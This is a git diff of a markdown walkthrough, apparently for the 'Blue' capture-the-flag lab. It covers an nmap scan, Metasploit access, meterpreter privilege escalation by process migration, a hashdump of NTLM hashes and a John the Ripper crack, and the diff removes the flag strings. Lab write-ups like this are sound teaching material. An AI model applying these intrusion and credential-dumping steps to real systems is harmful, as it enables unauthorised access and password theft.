@@ -1,15 +1,20 @@
 ---
-title: blue
+title: Blue
 ---
 
-# TASK 1 - RECON
+
+# Tools and Commands
+
+- nmap
+- msfconsole: search, use, options, set , run
+- meterpreter: shell, whoami, ps, migrate, search
+- hashdump
+- john
+
+# Task 1 - Recon
 
 ```bash
 kali@kali:~$ nmap -A  10.10.126.100
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 08:21 EDT
-Nmap scan report for 10.10.126.100
-Host is up (0.28s latency).
-Not shown: 991 closed ports
 PORT      STATE SERVICE            VERSION
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
@@ -46,7 +51,7 @@ Host script results:
 
 ```
 
-# TASK 2 - GAIN ACCESS
+# Task 2 - Gain Access
 
 ```bash
 $ msfconsole
@@ -59,7 +64,7 @@ $ msfconsole
 WIN
 ```
 
-# TASK 3 - ESCALATE
+# Task 3 - Escalate
 
 ```bash
 C:\  > # ctrl-z to background
@@ -76,39 +81,35 @@ met  > ps # note any pid running from nt authority\system
 met  > migrate 2696 # run from process with nt authority\system
 ```
 
-# TASK 4 - CRACKING
+# Task 4 - Cracking
 
 ```bash
-hashdump
+$ hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
 # save those to txt including username etc
-sudo john pw.txt
-PASSWORD CRACK FAIL
+
+$ sudo john hash
 alqfna22
 ```
 
-# TASK 5 - FLAGS
+# Task 5 - Flags
 
 ```bash
-
 met > pwd
 met > cd c:/
 met > ls
 met > cat flag1.txt
-flag{access_the_machine}
 
 met > search -f flag*.txt
 Found 3 results...
     c:\flag1.txt (24 bytes)
     c:\Users\Jon\Documents\flag3.txt (37 bytes)
     c:\Windows\System32\config\flag2.txt (34 bytes)
-cd win
 
 cat c:/Windows/System32/config/flag2.txt
-flag{sam_database_elevated_access}
 
 cat c:/Users/Jon/Documents/flag3.txt
-flag{admin_documents_can_be_valuable}
 ```
